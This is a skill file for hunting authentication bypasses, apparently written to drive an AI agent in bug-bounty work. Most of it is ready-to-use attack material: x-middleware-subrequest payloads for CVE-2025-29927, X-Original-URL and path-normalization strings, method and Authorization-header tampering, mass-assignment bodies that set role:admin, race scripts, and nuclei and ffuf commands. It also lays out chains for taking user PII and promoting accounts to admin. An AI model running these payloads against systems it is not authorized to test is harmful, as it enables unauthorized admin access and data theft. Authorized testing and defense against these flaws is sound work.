---
name: hunt-auth-bypass
description: "Modern Authentication Bypass hunting (2025-2026). Use when target has /admin, /api, /internal, login flow, or any auth-gated endpoint. Covers CVE-2025-29927 Next.js middleware bypass, X-Original-URL/X-Rewrite-URL injection, path normalization tricks, method tampering, status confusion, race conditions on signup/reset, cookie scoping abuse, JWT/session manipulation chains, and pre-auth admin reach. Skip if all admin endpoints return strict 401 with no header tricks accepted."
---

# Authentication Bypass Hunt — 2025-2026 Powerful Edition

Auth bypass pays Critical because it's pre-auth → admin in one request. Find one and you've shortcut every other attack chain. This skill drives toward **bypassing the gate, then proving impact** (admin access, other-user data, admin actions).

> **Bar:** "endpoint returned 200 with my header" is not enough. Prove you read or modified something requiring auth. PoC must include the protected data extracted.

---

## 0. 60-Second Recon

```bash
# Map the auth perimeter
for p in /admin /administrator /api/admin /api/internal /actuator /console /manager \
         /debug /metrics /swagger /graphql /private /staff /backoffice /dashboard \
         /user/me /api/users /api/v1/admin; do
  code=$(curl -ks -o /dev/null -w "%{http_code}" https://target.com$p)
  echo "$p => $code"
done

# Identify framework
curl -ksI https://target.com | grep -iE 'server|x-powered-by|set-cookie'
# Next.js? Tomcat? Django? Express? PHP? IIS? — different bypass classes

# Look for reverse-proxy hops (added headers)
curl -ksI https://target.com | grep -iE 'via|x-cache|cf-ray|x-amz-cf-id|x-forwarded|x-served-by'
```

---

## 1. The Attack Matrix (priority)

| # | Technique | Detection | Effort | Bounty |
|---|-----------|-----------|--------|--------|
| 1 | CVE-2025-29927 Next.js middleware | Next.js, /admin returns 401 | 2 min | Critical $5k–$30k |
| 2 | X-Original-URL / X-Rewrite-URL | reverse proxy (Apache/nginx + Tomcat/Spring) | 5 min | $1k–$10k |
| 3 | Path normalization tricks | `/admin/..;/` reaches admin | 5 min | $1k–$8k |
| 4 | Method tampering | POST→GET on protected | 3 min | $500–$5k |
| 5 | Auth header omission | Strip `Authorization: Bearer` | 1 min | $500–$3k |
| 6 | Trailing slash / dot / null | `/admin/.` or `/admin%00` | 2 min | $500–$3k |
| 7 | Verb tampering | HEAD / TRACE / OPTIONS reaches resource | 3 min | $300–$2k |
| 8 | Case sensitivity | `/Admin` vs `/admin` | 1 min | $200–$2k |
| 9 | HTTP/2 method override | `:method` pseudo-header | 5 min | $1k–$5k |
| 10 | Status code confusion | server returns 200 but body has "Unauthorized" | 5 min | varies |
| 11 | Race condition on signup | dup-email under race | 15 min | $2k–$10k |
| 12 | Session fixation | attacker session value pre-login | 10 min | $500–$3k |
| 13 | Cookie scoping abuse | parent-domain cookie | 10 min | $1k–$5k |
| 14 | Mass-assignment to admin | hidden `role`/`is_admin` field accepted | 10 min | $2k–$10k |
| 15 | Sign-in OTP bypass via response manipulation | change 403→200 | 5 min | $1k–$5k |
| 16 | "Remember me" predictable token | look at token entropy | 10 min | $500–$5k |
| 17 | OAuth/SSO bypass (see hunt-oauth) | callback tampering | 15 min | $3k–$30k |

---

## 2. CVE-2025-29927 — Next.js Middleware Bypass (2025's biggest auth bypass)

### Detection
Target uses Next.js. Test `/admin`, `/dashboard`, `/api/private` — protected.

### Payloads (try each in order)

**Next.js 15.x (< 15.2.3):**
```http
GET /admin HTTP/1.1
Host: target.com
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

**Next.js 14.x (< 14.2.25):**
```http
GET /admin HTTP/1.1
Host: target.com
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
or
```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

**Next.js 13.x (< 13.5.9):**
```
x-middleware-subrequest: middleware
x-middleware-subrequest: src/middleware
```

**Next.js 12.x (< 12.3.5):**
```
x-middleware-subrequest: pages/_middleware
x-middleware-subrequest: pages/dashboard/_middleware
```

### Confirmation
- Status changes from 401/403 → 200
- Body contains admin/dashboard content (not the login page)
- Cross-account: header bypass works without **any** valid session

### Bounty
Critical $5k–$30k. CVSS 9.1. Affects millions of sites in 2025.

### Nuclei template
```bash
nuclei -l live.txt -t http/cves/2025/CVE-2025-29927.yaml
```

---

## 3. X-Original-URL / X-Rewrite-URL Injection

Reverse-proxy authorization (Apache, nginx) often checks the URL in the request line. But Spring/Tomcat/some backends re-resolve the path from `X-Original-URL` or `X-Rewrite-URL` headers, bypassing the proxy check.

### Payloads
```http
GET /public HTTP/1.1
Host: target.com
X-Original-URL: /admin

GET /public HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin

GET /public HTTP/1.1
Host: target.com
X-Forwarded-Path: /admin

GET /public HTTP/1.1
Host: target.com
X-Override-URL: /admin

GET /public HTTP/1.1
Host: target.com
X-HTTP-Method-Override: PUT
```

### When to suspect
- Target front-ended by Apache/nginx + Java/Spring/Tomcat backend
- Different responses when path is in URL vs header
- Anytime you see 403 on a specific path

---

## 4. Path Normalization Tricks

Front-end checks `/admin` → 403. Backend re-parses path differently.

```
/admin                  → 403
/admin/                 → 200 ?
/admin//                → 200 ?
/admin/.                → 200 ?
/admin/.;               → 200 ? (Tomcat semicolon)
/admin..;/              → 200 ? (Tomcat path-param)
/admin/..;/admin/       → 200 ?
/.//admin               → 200 ?
/%2e/admin              → 200 ?
/admin%20               → 200 ?
/admin%09               → 200 ?
/admin%00               → 200 ?
/admin%23               → 200 ? (URL-encoded #)
/admin#x                → 200 ? (fragment, mostly client-side)
//admin                 → 200 ?
/;/admin                → 200 ?
/admin%2f               → 200 ?
/admin\..               → 200 ? (backslash on Windows IIS)
/admin\.\./             → 200 ?
/secret/../admin        → 200 ?
/api/v1/../admin        → 200 ?
/static/../admin        → 200 ?
//admin/                → 200 ?
```

### IIS-specific
```
/admin::$DATA           (NTFS alternate stream)
/admin*~1               (Windows 8.3 short names)
/Admin                  (case)
```

### Apache mod_proxy / Tomcat connector
Double-encoded slash:
```
/admin%252e%252e/admin
/admin%c0%af              (overlong UTF-8 /)
```

---

## 5. HTTP Method Tampering

Many auth filters apply only to specific methods. Try all:

```http
GET    /api/admin/users
POST   /api/admin/users    (sometimes routes go to different handler)
PUT    /api/admin/users
PATCH  /api/admin/users
DELETE /api/admin/users
HEAD   /api/admin/users
OPTIONS /api/admin/users
TRACE  /api/admin/users
CONNECT /api/admin/users
SEARCH /api/admin/users
PROPFIND /api/admin/users    (WebDAV)
```

### HTTP/2 method override
HTTP/2 allows `:method` pseudo-header. Some HTTP/1-bound auth filters in front of HTTP/2 backends miss this.

### Method override headers
```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT
X-HTTP-Method: PUT
X-Method-Override: PUT
```

---

## 6. Authorization Header Tricks

```http
# 1. Strip entirely (sometimes default-allow happens)
Authorization:                       (empty)
(no Authorization header at all)

# 2. Malformed token
Authorization: Bearer
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: Bearer none
Authorization: Bearer 0

# 3. Wrong scheme
Authorization: Basic YWRtaW46YWRtaW4=     (admin:admin)
Authorization: Token <random>
Authorization: <jwt>                        (no Bearer prefix)

# 4. Duplicate headers
Authorization: Bearer good
Authorization: Bearer evil

# 5. Casing
authorization: Bearer X
AUTHORIZATION: Bearer X

# 6. Body vs header
Authorization in header is rejected; same token in ?token= URL param accepted
```

---

## 7. Status Code / Response Confusion

Server returns `200 OK` with `{"error":"unauthorized"}` body — but client code only checks status code. Or vice versa.

Test:
```bash
curl -ks https://target.com/api/admin/users -w "\nHTTP %{http_code}\n"
# 401 with full body of users? = bypass via body
# 200 with "unauthorized" body? = client bypass possible
```

### Frontend bypass
If the SPA hides admin links because `user.role !== 'admin'`, but the API doesn't enforce — bypass by direct API call.

### Differential response
Anonymous: `/api/users` → 200 with public users only (5 users).
Authed: same endpoint → 200 with all (1000 users).
That's auth-aware filtering; if the count or fields differ, the endpoint exists, just gates output. Try params (`?all=true`, `?include_private=1`, etc.) to see if filter can be removed.

---

## 8. Race Conditions in Signup / Reset

### 8.1 Email-uniqueness race
```python
# Burp Turbo Intruder — 50 parallel registrations with same email
for i in range(50):
    engine.queue(template, attack=str(i))
```
If two accounts created with same email → confusion at login.

### 8.2 Password-reset token race (CVE-class pattern)
Send 50 parallel "request reset" for same email; check if some tokens collide / are predictable / one accidentally returns the token in response body.

### 8.3 Sign-up under "already exists" check
Some apps check email existence then create — race the window:
```
T0: send signup attempt 1 (queues check)
T0: send signup attempt 2 (queues check)
T1: both checks pass, both create
```
Result: two accounts with same email; login flow gets confused, sometimes loads wrong user.

---

## 9. Session Fixation

```
1. Attacker visits /login, gets session cookie SES=AAA
2. Attacker sends victim a link with SES=AAA pinned (Set-Cookie via XSS-on-subdomain or via login URL param)
3. Victim logs in. Server upgrades SES=AAA to authenticated.
4. Attacker uses SES=AAA. Authenticated as victim.
```

### Test
- Login. Check if same session cookie value persists pre-login → post-login. If yes → fixation risk.
- After login, check that `Set-Cookie` rotates the session ID.

---

## 10. Cookie Scoping / Domain Abuse

### 10.1 Parent-domain cookie hijack
Cookie scoped to `.target.com`. Any subdomain controlled by attacker (or takeover-able) reads/sets this cookie. Chain:
```
hunt-subdomain-takeover → takeover-able subdomain
→ attacker code on staging.target.com
→ document.cookie reads SESSION
→ ATO
```

### 10.2 Cookie injection via Set-Cookie from subdomain
A subdomain that lets you set arbitrary headers (via SSRF, redirect, etc.) can inject cookies for the parent.

### 10.3 Cookie prefix bypass
`__Host-` and `__Secure-` prefixes enforce strict scoping. Try cookies without these prefixes — older code paths may accept.

---

## 11. Mass Assignment to Admin

Many APIs accept extra fields and assign them blindly.

```http
POST /api/signup HTTP/1.1
Content-Type: application/json

{"email":"a@a.com","password":"X","role":"admin","is_admin":true,"isStaff":true,"groups":["admin"],"permissions":["*"]}
```

Or in profile update:
```http
PATCH /api/me HTTP/1.1
{"email":"new@a.com","role":"admin"}
```

### Hidden field discovery
- Look at admin-edit response — what fields does an admin's profile have that yours doesn't?
- Try those in your PATCH.

---

## 12. Sign-in OTP / 2FA Response Manipulation

Backend returns OTP-verification result as `{"success":false}`. Client checks this. Tamper:
```
Response:
HTTP/1.1 200 OK
{"success":true,"redirect":"/dashboard"}
```
If client honors → bypass.

### Backup-code reuse
Use a backup code, then try the same code again. Often consumed-flag not enforced server-side.

### See hunt-mfa-bypass for full MFA matrix.

---

## 13. "Remember Me" Token Weakness

- Hash of `userid + secret` with weak secret → cracked by hashcat
- UUIDv1 with predictable timestamp/MAC → enumerate
- Base64 of user object with no signature → tamper to admin user_id

```bash
# Decode remember_me cookie
echo "<token>" | base64 -d | hexdump -C
# Look for: structured data, JSON, user_id, role
```

---

## 14. The Big Mistake List (high-frequency findings)

| Bug class | Indicator | Test |
|-----------|-----------|------|
| Frontend-only auth | Admin UI hidden by JS | Curl the API directly |
| /api/ unauth'd | `/api/users` returns data anonymously | curl without Auth header |
| Internal API exposed | `/internal`, `/_internal`, `/admin-api` reachable | Direct probe |
| API version old | `/api/v1` strict, `/api/v0` or `/api/legacy` permissive | Try old versions |
| Debug mode | `/debug`, `/__debug__`, `/admin/debug` | Direct probe |
| Heroku/Render staging | `<id>.herokuapp.com` mirrors with no auth | DNS recon |
| Pre-release branch | `staging.target.com`, `dev.target.com` no auth | DNS recon |
| GraphQL introspection | `/graphql?query={__schema{types{name}}}` | Direct query |
| Backup endpoint | `/backup`, `/dump`, `/export` | Direct probe |

---

## 15. Chain to Critical

### 15.1 Bypass → admin panel
1. Reach /admin via §2-§4 bypass.
2. Read list of users (PII).
3. Export to attacker.
4. = Critical $10k+.

### 15.2 Bypass → admin action
1. Reach POST /admin/users/{id}/role (header bypass).
2. Promote attacker test account to admin.
3. Login with attacker creds = full admin = Critical.

### 15.3 Bypass → cross-tenant
1. Hit `/api/orgs/{victim_org}/invoices` with header bypass.
2. Read victim org's data.
3. = Critical cross-tenant.

### 15.4 Mass assignment → admin
1. Signup with `role:admin`.
2. Login normally.
3. Access admin features.
4. = Critical privilege escalation.

### 15.5 Race signup → email confusion → password reset victim's account
Complex but pays — see Mars H1 report $30k.

---

## 16. Validation Gate

Before reporting:
1. **You read real protected data?** (Not just observed 200 OK.)
2. **A clean test account confirms** the bypass works from scratch?
3. **Not a debug-mode artifact**? (Staging != prod.)
4. **Not in scope as out-of-scope tech-debt**?
5. **Single-request PoC**? (Multi-step chains are also fine; document each step.)

---

## 17. Tools

```bash
# Nuclei
nuclei -l live.txt -tags auth-bypass -severity critical,high
nuclei -l live.txt -t http/cves/2025/CVE-2025-29927.yaml

# Auth bypass header fuzz
ffuf -u https://target.com/admin -H "FUZZ: /admin" -w headers.txt -mc 200,302,401

# Path bypass fuzz
ffuf -u https://target.com/adminFUZZ -w path-bypass-payloads.txt -mc 200,302,401
ffuf -u https://target.com/FUZZ/admin -w prefix-payloads.txt -mc 200,302,401

# Bypass-403
bypass-403.sh https://target.com/admin
```

---

## 18. Quick Decision Tree

```
Protected endpoint returns 401/403?
├── Next.js?                  -> §2 CVE-2025-29927 first
├── Apache/nginx+backend?     -> §3 X-Original-URL / §4 path tricks
├── Tomcat/Jetty?             -> §4 ;jsessionid, /..;/, /.//admin
├── IIS?                      -> §4 ::$DATA, *~1, case
├── Default reverse proxy?    -> §3 + §5 method tampering
├── Auth via SPA only?        -> §7 curl the API directly
└── Cookie-based session?     -> §9 fixation, §10 scoping

Signup endpoint?
├── Email-uniq check?         -> §8 race
└── Body accepts extra?       -> §11 mass assignment

Got bypass -> §15 chain to admin/cross-tenant -> §16 validate.
```

---

## 19. Mantras

- Reverse-proxy + backend differential is the #1 source of 2024-2025 auth bypasses (CVE-2025-29927 is the latest).
- Test every protected path with every header/method combination — auth filters are inconsistent.
- A 200 with no admin content is not a bypass. Read or modify something real.
- Race conditions on signup/reset are an under-tested goldmine. Burp Turbo Intruder.
- Mass assignment is one curl away. Every signup, every PATCH, every PUT — add `role:admin`.
- Next.js sites: ALWAYS test CVE-2025-29927 before anything else. It's a 2-minute Critical.
